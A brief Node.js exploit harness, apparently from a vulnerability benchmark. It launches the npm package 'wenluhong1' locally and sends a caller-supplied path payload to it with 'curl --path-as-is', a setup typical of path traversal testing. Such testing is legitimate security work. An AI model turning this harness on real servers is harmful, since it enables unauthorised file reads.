const path = require("path");
const { exec } = require("child_process");
const sleep = require("sleep");

function exploitFunction(payload) {
  let server = "node ./node_modules/wenluhong1/index.js";
  let exe = exec(server, (error, stdout) => {
    sleep.sleep(2);
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
    exec(attack_string, (error, stdout) => {
      return stdout;
    });
  });

  return new Promise((resolve) => {
    exe.on("close", (code) => {
      resolve(exe.stdout);
    });
  });
}

module.exports = { exploitFunction };